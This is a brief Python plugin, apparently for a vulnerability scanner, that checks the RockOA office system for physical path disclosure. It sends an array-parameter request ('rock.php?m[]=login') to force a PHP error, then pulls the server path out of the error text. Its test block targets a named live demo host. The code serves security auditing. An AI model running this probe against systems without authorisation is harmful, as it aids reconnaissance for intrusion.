#!/usr/bin/env python
# -*- coding: utf-8 -*
# rockoa物理路径泄露

import re
def assign(service, arg):
    if service == 'rockoa':
        return True, arg
        
def audit(arg):
    payload = "rock.php?m[]=login"
    code,_,res,_,_ = curl.curl2(arg+payload)
    if code == 500:
        pk = re.findall(r'in (.*) on line', res)
        if (len(pk) > 0):
            security_warning(arg+':'+pk[0])

if __name__ == '__main__':
    from dummy import *
    audit(assign('rockoa','http://demo.xh829.com/')[1])